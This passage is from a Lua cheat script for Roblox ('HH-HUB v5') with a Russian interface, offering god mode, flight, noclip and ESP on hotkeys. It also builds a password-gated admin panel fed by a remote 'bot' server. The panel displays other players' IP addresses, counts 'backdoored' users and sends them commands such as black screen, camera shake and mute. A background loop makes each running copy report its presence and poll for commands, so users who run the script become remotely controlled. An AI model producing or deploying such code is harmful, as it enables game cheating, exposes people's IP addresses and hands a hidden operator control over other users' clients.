            sendToBot("/api/commands", { target_id = uid, command = "BLACK_SCREEN", data = "", sender_id = USER_ID })
        end)
        addBtn("✨ Flash", Color3.fromRGB(200, 180, 0), function()
            sendToBot("/api/commands", { target_id = uid, command = "FLASH_SCREEN", data = "", sender_id = USER_ID })
        end)
        addBtn("🌀 Shake", Color3.fromRGB(150, 150, 150), function()
            sendToBot("/api/commands", { target_id = uid, command = "SHAKE_CAMERA", data = "", sender_id = USER_ID })
        end)
        addBtn("🔇 Mute", Color3.fromRGB(80, 80, 120), function()
            sendToBot("/api/commands", { target_id = uid, command = "MUTE_GAME", data = "", sender_id = USER_ID })
        end)
        addBtn("📢 Unmute", Color3.fromRGB(80, 120, 80), function()
            sendToBot("/api/commands", { target_id = uid, command = "UNMUTE_GAME", data = "", sender_id = USER_ID })
        end)
        addBtn("🌐 IP", Color3.fromRGB(60, 100, 180), function()
            safeNotify("IP: " .. uid, info.ip or "Unknown", 5)
        end)
    end
    
    local function refreshList()
        for _, child in ipairs(scroll:GetChildren()) do
            if child:IsA("Frame") then
                child:Destroy()
            end
        end
        
        local players = getFromBot("/api/players")
        if not players then return end
        
        local searchText = searchBox.Text:lower()
        local total, same, bd = 0, 0, 0
        
        for uid, info in pairs(players) do
            if type(info) ~= "table" then continue end
            total = total + 1
            if info.same then same = same + 1 end
            if info.hasBackdoor then bd = bd + 1 end
            if searchText == "" or (info.name and info.name:lower():find(searchText, 1, true)) then
                addPlayerCard(uid, info)
            end
        end
        
        totalLbl.Text = "Всего: " .. total
        sameLbl.Text = "В сервере: " .. same
        bdLbl.Text = "Бекдор: " .. bd
    end
    
    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
        pcall(refreshList)
    end)
    
    refreshBtn.MouseButton1Click:Connect(function()
        pcall(refreshList)
    end)
    
    pcall(refreshList)
    
    task.spawn(function()
        while adminPanel and adminPanel.Parent do
            task.wait(8)
            pcall(refreshList)
        end
    end)
end

-- ==============================================
-- ФОНОВЫЙ ЦИКЛ
-- ==============================================
task.spawn(function()
    while true do
        pcall(updatePresence)
        pcall(readCommands)
        task.wait(10)
    end
end)

-- ==============================================
-- СМЕНА ПЕРСОНАЖА
-- ==============================================
LP.CharacterAdded:Connect(function()
    task.wait(1)
    if GodMode.active then enableGodMode() end
    if Noclip.active then enableNoclip() end
    if Flight.active then enableFlight() end
end)

-- ==============================================
-- ГОРЯЧИЕ КЛАВИШИ
-- ==============================================
UIS.InputBegan:Connect(function(input, gp)
    if gp then return end
    
    if input.KeyCode == Enum.KeyCode.Insert then
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Health = hum.MaxHealth end
    elseif input.KeyCode == Enum.KeyCode.Delete then
        if GodMode.active then disableGodMode() else enableGodMode() end
    elseif input.KeyCode == Enum.KeyCode.Home then
        if Flight.active then disableFlight() else enableFlight() end
    elseif input.KeyCode == Enum.KeyCode.RightShift then
        if Noclip.active then disableNoclip() else enableNoclip() end
    elseif input.KeyCode == Enum.KeyCode.RightAlt then
        if ESP.active then disableESP() else enableESP() end
    elseif input.KeyCode == Enum.KeyCode.End then
        if not isAdmin then
            local passGui = Instance.new("ScreenGui")
            passGui.ResetOnSpawn = false
            passGui.Parent = getPG()
            
            local pf = Instance.new("Frame", passGui)
            pf.Size = UDim2.new(0, 300, 0, 148)
            pf.Position = UDim2.new(0.5, -150, 0.5, -74)
            pf.BackgroundColor3 = Color3.fromRGB(18, 16, 30)
            pf.Active = true
            pf.Draggable = true
            pf.BorderSizePixel = 0
            Instance.new("UICorner", pf).CornerRadius = UDim.new(0, 12)
            
            local pt = Instance.new("TextLabel", pf)
            pt.Size = UDim2.new(1, -50, 0, 38)
            pt.Position = UDim2.new(0, 0, 0, 0)
            pt.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            pt.BackgroundTransparency = 0.3
            pt.Text = "🔐 Авторизация"
            pt.TextColor3 = Color3.fromRGB(200, 150, 255)
            pt.TextScaled = true
            pt.Font = Enum.Font.GothamBold
            Instance.new("UICorner", pt).CornerRadius = UDim.new(0, 12)
            
            local pClose = Instance.new("TextButton", pf)
            pClose.Size = UDim2.new(0, 34, 0, 34)
            pClose.Position = UDim2.new(1, -38, 0, 2)
            pClose.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
            pClose.Text = "✕"
            pClose.TextColor3 = Color3.fromRGB(255, 255, 255)
            pClose.TextScaled = true
            pClose.Font = Enum.Font.GothamBold
            pClose.BorderSizePixel = 0
            pClose.ZIndex = 5
            Instance.new("UICorner", pClose).CornerRadius = UDim.new(0, 7)
            pClose.MouseButton1Click:Connect(function()
                passGui:Destroy()
            end)
            
            local box = Instance.new("TextBox", pf)
            box.Size = UDim2.new(0.84, 0, 0, 34)
            box.Position = UDim2.new(0.08, 0, 0, 46)
            box.BackgroundColor3 = Color3.fromRGB(32, 30, 50)
            box.PlaceholderText = "Ключ доступа"
            box.Text = ""
            box.TextColor3 = Color3.fromRGB(255, 255, 255)
            box.TextScaled = true
            box.Font = Enum.Font.Gotham
            box.ClearTextOnFocus = false
            box.BorderSizePixel = 0
            Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
            
            local sub = Instance.new("TextButton", pf)
            sub.Size = UDim2.new(0.5, 0, 0, 34)
            sub.Position = UDim2.new(0.25, 0, 0, 88)
            sub.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
            sub.Text = "Войти"
            sub.TextColor3 = Color3.fromRGB(255, 255, 255)
            sub.TextScaled = true
            sub.Font = Enum.Font.GothamBold
            sub.BorderSizePixel = 0
            Instance.new("UICorner", sub).CornerRadius = UDim.new(0, 8)
            
            local function check()
                if box.Text == ADMIN_PASSWORD then
                    isAdmin = true
                    passGui:Destroy()
                    createAdminPanel()
                else
                    box.Text = ""
                    box.PlaceholderText = "❌ Неверно!"
                end
            end
            
            sub.MouseButton1Click:Connect(check)
            box.FocusLost:Connect(function(enter)
                if enter and box.Text ~= "" then
                    check()
                end
            end)
        else
            if adminPanel then
                adminPanel:Destroy()
                adminPanel = nil
            else
                createAdminPanel()
            end
        end
    end
end)

-- ==============================================
-- ЗАПУСК
-- ==============================================
task.wait(1)

-- Создаём иконку и главное меню
createIcon()
createMainMenu()

safeNotify("⚡ HH-HUB v5", "Загружено! INS-лечение | DEL-God | HOME-полёт | END-панель", 4)

print = oldPrint
warn = oldWarn
